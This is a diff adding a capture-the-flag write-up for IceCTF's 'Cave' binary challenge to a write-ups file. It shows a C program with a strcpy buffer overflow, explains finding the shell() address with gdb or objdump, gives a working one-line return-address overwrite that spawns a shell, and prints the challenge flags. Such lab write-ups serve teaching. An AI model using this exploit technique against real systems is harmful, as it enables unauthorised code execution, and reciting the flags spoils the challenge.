@@ -16,6 +16,7 @@ Friðfinnur                     Web            200    IceCTF{you_found_debug}
 History of Computing           Web            350
 
 Simple Overflow                Binary         250
+Cave                           Binary         50     IceCTF{i_dont_think_caveman_overflowed_buffers}
 Twitter                        Binary         800
 
 Modern Picasso                 Forensics      150    IceCTF{wow_fast}
@@ -172,6 +173,7 @@ session: {"user":3}.?.?
 ```
 
 **Flag**
+
 ## Binary Exploit 200: Simple Overflow
 
 **Challenge**
@@ -249,6 +251,64 @@ int main(int argc, char **argv) {
 ```
 
 **Flag**
+
+## Binare Exploit 50: Cave
+
+**Challenge**
+
+You stumbled upon a cave! I've heard some caves hold secrets.. can you find the secrets hidden within its depths?
+
+
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+void shell() {
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+    system("/bin/sh -i");
+}
+
+void message(char *input) {
+    char buf[16];
+    strcpy(buf, input);
+
+    printf("The cave echoes.. %s\n", buf);
+}
+
+int main(int argc, char **argv) {
+    if (argc > 1){
+        message(argv[1]);
+    } else {
+        printf("Usage: ./shout <message>\n");
+    }
+    return 0;
+}
+```
+
+**Solution**
+
+Another buffer overflow challenge, this time we need to overwrite the return address to call the `shell()` function.
+First we need to find out what that address should be, we can do this with gdb's `info functions shell` or
+`objdump -d ./shout | grep shell` and find out that the address is `0x0804850b`
+
+So we need to overwrite the return address with this address, in little endian order:
+
+```
+./shout `python -c "print('a'*28+'\x0b\x85\x04\x08')"`
+```
+
+this gives us a root shell and we can read the contents of `flag.txt` to read our flag:
+
+**Flag**
+
+```
+IceCTF{i_dont_think_caveman_overflowed_buffers}
+```
 
 ## Binary Exploit 800: Twitter
 
